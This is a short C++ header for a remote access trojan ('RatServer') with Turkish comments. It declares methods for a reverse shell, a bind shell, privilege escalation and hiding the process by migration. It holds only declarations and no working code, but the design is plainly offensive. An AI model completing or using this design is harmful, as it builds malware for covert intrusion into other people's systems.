#ifndef __TEM_RAT_HPP__
#define __TEM_RAT_HPP__

#include "csock.hpp"

class RatServer{
private:
    uint ratPort;
    const char *ratIP;

    bool temReverseShell();                       //reverse shell baslatir
    bool temBindShell();                          //bind shell portuna baglanir
public:
    RatServer(const char *ratIP , uint ratPort);  //rat serveri baslatir
    

    bool temPrivilegeEscalation();                //yetki yukseltme
    bool temMigrateProcess();                     //processi saklama

    
};


#endif 